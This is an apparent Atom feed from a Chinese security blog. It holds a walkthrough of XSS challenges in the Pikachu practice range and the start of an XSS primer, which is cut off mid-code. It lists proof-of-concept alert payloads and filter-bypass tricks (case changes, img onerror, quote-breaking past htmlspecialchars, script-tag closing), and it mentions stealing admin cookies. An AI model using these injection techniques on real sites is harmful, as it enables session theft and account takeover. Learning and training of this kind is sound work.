<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://mobius-0.github.io</id>
    <title>Khala • Posts by &#34;xss&#34; tag</title>
    <link href="https://mobius-0.github.io" />
    <updated>2022-12-03T12:20:55.000Z</updated>
    <category term="Hexo" />
    <category term="shoya" />
    <category term="网站" />
    <category term="网络安全" />
    <category term="工具" />
    <category term="虚拟机" />
    <category term="安全" />
    <category term="星际争霸2" />
    <category term="平衡" />
    <category term="杂谈" />
    <category term="小说" />
    <category term="江南" />
    <category term="龙族" />
    <category term="动画" />
    <category term="法律法规" />
    <category term="XSS" />
    <category term="漏洞" />
    <category term="渗透测试" />
    <category term="靶场" />
    <category term="pikachu" />
    <category term="标准" />
    <category term="OCI" />
    <category term="CRI" />
    <category term="HTTP" />
    <category term="计算机网络" />
    <category term="IPSec" />
    <category term="VPN" />
    <category term="SSL" />
    <category term="TLS" />
    <category term="WiFi" />
    <category term="邮件" />
    <category term="网络协议" />
    <category term="Linux" />
    <category term="渗透" />
    <category term="信息收集" />
    <category term="痕迹清理" />
    <category term="Windows" />
    <category term="内网" />
    <category term="后门" />
    <category term="免杀" />
    <category term="代理" />
    <category term="Shell" />
    <category term="远程连接" />
    <category term="入侵检测" />
    <category term="IDS" />
    <category term="IPS" />
    <category term="防御加固" />
    <category term="管理策略" />
    <category term="分工" />
    <category term="职能" />
    <category term="情报" />
    <category term="运营" />
    <category term="应急响应" />
    <category term="流程" />
    <category term="攻击溯源" />
    <category term="分析模型" />
    <category term="网络攻防" />
    <category term="蜜罐" />
    <category term="隐藏" />
    <category term="诱导" />
    <category term="防御纵深" />
    <category term="访问控制" />
    <category term="过滤" />
    <category term="框架" />
    <category term="风险" />
    <category term="控制" />
    <category term="CSRF" />
    <category term="服务器" />
    <category term="SQL注入" />
    <category term="SSRF" />
    <category term="Cache" />
    <category term="XXE" />
    <category term="XML" />
    <category term="Xpath" />
    <category term="注入" />
    <category term="函数" />
    <category term="绕过" />
    <category term="遍历" />
    <category term="包含" />
    <category term="文件" />
    <category term="目录" />
    <category term="读取" />
    <category term="上传" />
    <category term="中间件" />
    <category term="IIS" />
    <category term="Apache" />
    <category term="Nginx" />
    <category term="域名" />
    <category term="DNS" />
    <category term="WEB" />
    <category term="虚拟化" />
    <category term="Docker" />
    <category term="镜像" />
    <category term="逻辑" />
    <category term="策略配置" />
    <category term="ASP" />
    <category term="CSharp" />
    <category term="Golang" />
    <category term="Java" />
    <category term="语言" />
    <category term="反序列化" />
    <category term="混淆" />
    <category term="沙箱" />
    <category term="类" />
    <category term="JDK" />
    <category term="开发过程" />
    <category term="JavaScript" />
    <category term="PHP" />
    <category term="PowerShell" />
    <category term="Python" />
    <category term="Ruby" />
    <category term="端口" />
    <category term="社会工程学" />
    <category term="搜索" />
    <entry>
        <id>https://mobius-0.github.io/security/pikachu/pikachu-xss/</id>
        <title>pikachu-XSS</title>
        <link rel="alternate" href="https://mobius-0.github.io/security/pikachu/pikachu-xss/"/>
        <content type="html">&lt;h1 id=&#34;反射型xssget&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xssget&#34;&gt;#&lt;/a&gt; 反射型 XSS（get）&lt;/h1&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;在输入框中输入任意字段，查看页面代码可以发现输入字段已经被插入到了页面之中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/V5JlmdS31TrwkxC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;这里可以尝试直接输入相应的 XSS payload，如&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
&amp;lt;details+open+ontoggle=prompt(1)&amp;gt;
&amp;lt;svg/onload=confirm(1)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;等&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;输入的时候可以发现输入框有输入字符的上限（并且该输入框在测试时还可以发现其对输入字符髌骨无限制，特殊字符如 / 等可以直接插入到前端代码中），但这些不算很重要，我们可以直接在前端的代码上修改，也可以在网页的 url 上根据规律进行插入&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/Vbk6tW7wDxhspGz.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;反弹结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/AB1TUmItyG54pMq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/OqeGpAaHP6uxFit.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;GET 方式要更容易被利用，因为相关元素可以直接通过网页 URL 直接提交，通常的利用形式为将带有跨站脚本的 URL 伪装后发送给目标&lt;/p&gt;
&lt;h1 id=&#34;反射型xsspost&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xsspost&#34;&gt;#&lt;/a&gt; 反射型 XSS（post）&lt;/h1&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;由于使用的是 post 方法，这里需要使用 burp suite 进行数据包的抓取&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/ULb8cZdWiSGvr7P.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;根据重放可知字符也已经插入页面代码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/I72ifcL89ymE1eR.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;修改抓取的数据包，将 message 修改为 XSS 的 payload&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/aBiIjJ1vV8hQkuC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;放行后输出结果，可以看到 payload 已经插入页面代码中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/QzElqaYN67yZdpF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/iMCDozdOaXBhxHm.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;POST 方式相对 GET 要更难被利用，但这同样存在安全隐患，这里就通过对数据包的篡改完成了 XSS 的 payload 插入，主要的利用方式会在 XSS 之盲打中会介绍&lt;/p&gt;
&lt;h1 id=&#34;存储型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#存储型xss&#34;&gt;#&lt;/a&gt; 存储型 XSS&lt;/h1&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先同样输入任意值，测试其是否存在对特殊字符的过滤&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/dtBg7R6PXwze3Mv.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;直接输入 XSS 的 payload，反弹结果，同时可以查看页面代码，发现 payload 已经被插入其中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/gxzHjGslwbOYSq9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/03/smBoa5QdLlWzgTf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;存储型 XSS 在道理上和反射型差不多，区别在于存储型会被存储起来，而反射型则是一次性的&lt;/p&gt;
&lt;h1 id=&#34;dom型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom型xss&#34;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h1&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;同样首先输入任意字符，查看页面元素可知字符已被插入到前端中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/coW2JHhNR79Qv16.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;输入 payload： &lt;code&gt;javascript:alert(1)&lt;/code&gt;  尝试触发漏洞，查看页面元素可知 payload 已被插入到前端，点击 &lt;code&gt;what do you see？&lt;/code&gt; 可以看到漏洞已触发&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/qJwzxBHbT5e1jNm.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这类型漏洞危害性不算非常大，但依旧需要留意&lt;/p&gt;
&lt;h1 id=&#34;dom型xss-x&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom型xss-x&#34;&gt;#&lt;/a&gt; DOM 型 XSS-X&lt;/h1&gt;
&lt;h2 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;与上一个关卡相同，先输入任意值，在页面元素中查看相关信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/CoBtrZPh4djYGKw.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;然后输入 payload 尝试触发漏洞，随后查看 payload 是否已经插入至页面元素中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/j98Bvde3KuTPcEx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这类型漏洞在某些方面与反射型 XSS 类似，它们同样都是通过 url 来获取输入，实际上在观察 url 内容后就可以发现 url 中有我们先前的输入 &lt;code&gt;javascript%3Aalert(1)&lt;/code&gt; ，其中 &lt;code&gt;:&lt;/code&gt;  在 url 内表现为 &lt;code&gt;%3A&lt;/code&gt; ，这些符号都有固定的翻译对应，例如空格就会翻译为 &lt;code&gt;%20&lt;/code&gt; 。&lt;/p&gt;
&lt;h1 id=&#34;xss之盲打&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之盲打&#34;&gt;#&lt;/a&gt; XSS 之盲打&lt;/h1&gt;
&lt;h2 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;老规矩，先输入任意值，在前端代码中并没有看到相应的输出，所以这里需要登录管理后台查看结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/WasLb8V4YG7tCju.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;随后输入 payload &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;  尝试触发漏洞，由于前端并没有对应代码显示，所以需要到后台查看漏洞是否被触发。可以看到弹窗，漏洞已经被触发。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/9PvRs8C3tpLwmMy.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-6&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;盲打主要指的是这么一种攻击场景，前端输入的内容只有在后端才能看到，这类型的攻击通常具有随机性，首先输入框有可能存在对特殊字符和语句的过滤，导致跨站脚本上传失败，即使能够上传成功，在后端也有可能有过滤或验证，导致脚本不一定会被触发。但是危害同样很大，如果不存在上述验证，那么完全可以将脚本替换为获取 cookie 的脚本，如果管理员登陆就有可能会被盗取 cookie，导致管理权限的外泄。&lt;/p&gt;
&lt;h1 id=&#34;xss过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss过滤&#34;&gt;#&lt;/a&gt; XSS 过滤&lt;/h1&gt;
&lt;h2 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;依旧是老规矩，首先随意输入查看过滤情况，可以发现如 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  或双写关键词 &lt;code&gt;&amp;lt;scrscriptipt&amp;gt;&lt;/code&gt;  等都被过滤掉了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尝试修改 payload 格式，发现大写形式是不会被过滤的，写入后成功触发漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/x6XeM7ckWntEDhH.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/vfBMTFm1Qa4qglS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-7&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这里漏洞的问题还是在于过滤的规则不够完善，查看源代码可以发现，实际上是只对 &lt;code&gt;&amp;lt;script&lt;/code&gt;  进行了过滤，简单点的绕过可以通过改变大小写来实现，同时也可以使用其他 payload 如 img 的标签 &lt;code&gt;&amp;lt;img src=x onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;/code&gt;  来实现绕过&lt;/p&gt;
&lt;h1 id=&#34;xss之htmlspecialchars&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之htmlspecialchars&#34;&gt;#&lt;/a&gt; XSS 之 htmlspecialchars&lt;/h1&gt;
&lt;h2 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;仍旧老规矩，随意输入字符，查看是否插入至前端中&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/UKlvPJfGhw9qraN.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;根据 htmlspecialchars 方法默认不对 &lt;code&gt;&#39;&lt;/code&gt;  进行处理的特点，我们可以构造 payload &lt;code&gt;1&#39; oneclick=&#39;alert(1)&#39;&lt;/code&gt; ，输入后查看结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/imwbCQnuKe5stIf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/Q8Hi6MuhG2zmelE.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-8&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;htmlspecialchars () 函数功能为把预定的字符转换为 HTML 实体，当前预定义的字符有：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;amp; → &amp;amp;amp
 &amp;quot; → &amp;amp;quot
 &#39; → &amp;amp;apos
 &amp;lt; → &amp;amp;lt
 &amp;gt; → &amp;amp;gt
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;xss之href输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之href输出&#34;&gt;#&lt;/a&gt; XSS 之 href 输出&lt;/h1&gt;
&lt;h2 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;随意输入字符，查看页面源代码插入位置&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/ZAHn1MfB73sbXTz.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;此处可以直接构造 payload &lt;code&gt;javascript:alert(1)&lt;/code&gt; ，输入后查看结果&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/3XBuyI1HLkNDaMT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/qBDJt5mx3flyzCF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-9&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这个漏洞比较简单，此处我们可以只允许 http、https，其次再进行 htmlspecialchars 处理&lt;/p&gt;
&lt;h1 id=&#34;xss之js输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss之js输出&#34;&gt;#&lt;/a&gt; XSS 之 js 输出&lt;/h1&gt;
&lt;h2 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;首先随意输入字符，发现代码中使用 $ms 来传递参数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/m3NqsvaHCuiAyZY.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;构造 payload 尝试闭合掉下方的 if 判断句 &lt;code&gt;1&#39;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/2lPxNofSVdvamrB.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/04/yjbYkTQBXlG7zWg.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结-10&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;这里主要的操作是再输入框后增加前端代码完成对原有代码的闭合，将原来的判断语句直接排除在外，这样就避免了 if 的验证，实现绕过。&lt;/p&gt;
</content>
        <category term="XSS" />
        <category term="漏洞" />
        <category term="渗透测试" />
        <category term="靶场" />
        <category term="pikachu" />
        <updated>2022-12-03T12:20:55.000Z</updated>
    </entry>
    <entry>
        <id>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/</id>
        <title>XSS</title>
        <link rel="alternate" href="https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/"/>
        <content type="html">&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。&lt;/p&gt;
&lt;h2 id=&#34;反射型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射型xss&#34;&gt;#&lt;/a&gt; 反射型 XSS&lt;/h2&gt;
&lt;p&gt;反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句： &lt;code&gt;&amp;lt;?php echo &amp;quot;&amp;lt;p&amp;gt;hello, $_GET[&#39;user&#39;]&amp;lt;/p&amp;gt;&amp;quot;;?&amp;gt;&lt;/code&gt;  ，那么在访问时设置  &lt;code&gt;/?user=&amp;lt;/p&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;hack&amp;quot;)&amp;lt;/script&amp;gt;&amp;lt;p&amp;gt;&lt;/code&gt;  ，则可执行预设好的 JavaScript 代码。&lt;/p&gt;
&lt;p&gt;反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、NoScript 等防御手段的影响较大。&lt;/p&gt;
&lt;h2 id=&#34;储存型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#储存型xss&#34;&gt;#&lt;/a&gt; 储存型 XSS&lt;/h2&gt;
&lt;p&gt;储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。&lt;/p&gt;
&lt;h2 id=&#34;dom-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom-xss&#34;&gt;#&lt;/a&gt; DOM XSS&lt;/h2&gt;
&lt;p&gt;DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;DOM Based XSS Demo&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;span class=&#34;token language-javascript&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;output&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;innerHTML &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;img src=&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;str&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#39;&gt;&amp;lt;/img&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token 